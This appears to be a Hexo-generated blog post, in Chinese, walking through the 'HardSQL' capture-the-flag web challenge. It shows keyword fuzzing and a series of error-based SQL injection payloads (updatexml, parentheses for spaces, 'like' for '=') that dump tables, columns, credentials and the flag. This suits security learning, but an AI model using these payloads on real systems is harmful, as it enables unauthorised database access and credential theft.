@@ -1,0 +1,122 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="HardSQL"><meta name="keywords" content="web,刷题"><meta name="author" content="Jardny"><meta name="copyright" content="Jardny"><title>HardSQL | Jardny's Blog</title><link rel="shortcut icon" href="/Jardny.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  hexoVersion: '6.3.0'
+} </script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Jardny's Blog" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HardSQL"><span class="toc-number">1.</span> <span class="toc-text">HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text">过滤问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Jardny</div><div class="author-info__description text-center">人生没有白走的路，走的每一步都算数！</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Jardny's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="{&quot;url&quot;:&quot;/&quot;}">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">Author</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">HardSQL</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-11-26</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">Web每日一题</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h1><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261010954.png" alt="image-20231126101043824"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and </span><br><span class="line">;show database()</span><br></pre></td></tr></table></figure>
+
+<p>都显示这句话，代表应该被过滤了</p>
+<p>但是不知道哪些被过滤了，所有要一个个跑，进行测试</p>
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261016045.png" alt="image-20231126101647903"></p>
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261105524.png" alt="image-20231126110518432"></p>
+<p>故这道题是单引号字符注入，没问题</p>
+<p>有语法错误显示，那应该可以用报错注入</p>
+<h2 id="过滤问题"><a href="#过滤问题" class="headerlink" title="过滤问题"></a>过滤问题</h2><p>因为这道题有过滤，但是不知道过滤了什么，所以可以用<font color="red">fuzz</font>进行测试</p>
+<p>fuzz，fuzz其实就是一种对请求参数的模糊测试</p>
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261252382.png" alt="image-20231126125256019"></p>
+<p>利用fuzz进行过滤测试</p>
+<p>发现长度为736的就是被过滤的</p>
+<p>长度为751的就是没有过滤的，那么就可以用这些关键字真不错~</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p>用括号子查询代替空格</p>
+<blockquote>
+<p>查出数据库</p>
+</blockquote>
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261305043.png" alt="image-20231126130512891"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geek</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查表</p>
+</blockquote>
+<p>不行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e),1))</span><br></pre></td></tr></table></figure>
+
+<p>行:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))%2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261317666.png" alt="image-20231126131700500"></p>
+<p>行吧原来是&#x3D;也被过滤了👍</p>
+<p>wp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261318230.png" alt="image-20231126131826181"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H4rDsq1</span><br></pre></td></tr></table></figure>
+
+<p>出现</p>
+<blockquote>
+<p>查字段名</p>
+</blockquote>
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261326269.png" alt="image-20231126132638188"></p>
+<p>我交的加结果。。。</p>
+<p>wp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(column_name)from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>me：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261330623.png" alt="image-20231126133018595"></p>
+<p>服了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261330052.png" alt="image-20231126133044975"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查数据</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261334662.png" alt="image-20231126133445575"></p>
+<p>出来一半因为这个默认显示32位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2c7883ce-9a07-41db-81</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((select(group_concat(id,username,password))from(H4Dsq1)),31,64)</span><br></pre></td></tr></table></figure>
+
+<p>me：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,((select(group_concat(id,username,password))from(H4Dsq1)),31,64),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p>又显示被抓到了。。。</p>
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261342061.png" alt="image-20231126134213947">行吧。。</p>
+<p>wp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>故：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7883ce-9a07-41db-8190-9cdb2055f</span><br></pre></td></tr></table></figure>
+
+<p>和之前的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2c7883ce-9a07-41db-81</span><br></pre></td></tr></table></figure>
+
+<p>不够再往后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b-8190-9cdb2055f0fa&#125;</span><br></pre></td></tr></table></figure>
+
+<p>组成完整的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2c7883ce-9a07-41db-8190-9cdb2055f0fa&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261346126.png" alt="image-20231126134607035"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1： 通过fuzz测试该sql注入过滤了什么关键词</p>
+<p>然后进行一步步绕过</p>
+<p>2：在测试的时候发现该题有语法报错，所以通过xml进行注入</p>
+<p>3：在现实flag的字段上出现显示不全的问题，那么通过right mid等函数进行一部分一部分的显示，达到最终拿到flag		 				 				 			</p>
+<p>​	right(str,len)</p>
+<p>​	返回最右侧的n个字符的字符串str</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Jardny</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/11/26/HardSQL/">http://example.com/2023/11/26/HardSQL/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/%E5%88%B7%E9%A2%98/">刷题</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2023/11/22/Fakebook/"><span>Fakebook</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By Jardny</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
